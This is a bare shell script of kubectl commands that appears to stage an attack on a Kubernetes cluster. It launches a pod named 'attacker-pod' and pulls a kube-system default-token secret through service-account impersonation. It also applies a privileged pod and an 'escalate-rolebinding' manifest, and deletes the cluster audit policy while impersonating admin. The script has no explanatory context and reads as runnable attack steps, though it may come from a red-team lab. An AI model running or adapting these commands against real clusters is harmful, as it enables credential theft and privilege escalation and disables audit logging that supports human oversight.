set -e

kubectl create ns secure-ops || true
kubectl config set-context --current --namespace=secure-ops

kubectl create sa monitoring || true
kubectl run attacker-pod --image=alpine --command -- sleep 3600 || true

kubectl auth can-i get secrets --as=system:serviceaccount:secure-ops:monitoring
kubectl get secret -n kube-system $(kubectl get secrets -n kube-system | grep default-token | head -n1 | awk '{print $1}') --as=system:serviceaccount:secure-ops:monitoring

kubectl apply -f privileged-pod.yaml

kubectl exec -n kube-system $(kubectl get pods -n kube-system | grep coredns | awk '{print $1}' | head -n1) -- cat /etc/resolv.conf || true

kubectl delete -f /etc/kubernetes/audit-policy.yaml --as=admin || true
kubectl apply -f escalate-rolebinding.yaml
